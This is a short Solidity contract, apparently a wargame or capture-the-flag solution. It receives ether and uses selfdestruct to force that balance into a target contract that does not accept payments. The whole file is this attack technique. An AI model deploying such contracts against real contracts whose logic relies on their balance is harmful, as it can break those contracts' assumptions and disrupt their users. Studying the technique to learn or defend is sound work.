// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceProxy {
    receive () external payable {} 

    function bruteForce(address payable _contract) external {
        selfdestruct(_contract);
    }
}
